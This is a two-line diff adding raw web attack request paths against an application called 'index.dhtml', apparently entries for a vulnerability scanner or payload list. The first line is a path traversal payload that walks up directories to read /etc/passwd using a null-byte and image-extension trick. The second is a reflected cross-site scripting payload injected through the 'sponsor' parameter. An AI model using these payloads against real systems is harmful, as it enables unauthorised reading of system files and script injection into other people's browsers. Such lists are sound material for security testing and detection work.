@@ -1,0 +1,2 @@
+/kvmlm2/index.dhtml?fname=&language=../../../../../../../../../../etc/passwd%00.jpg&lname=&sponsor=gdi&template=11
+/index.dhtml?sponsor=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
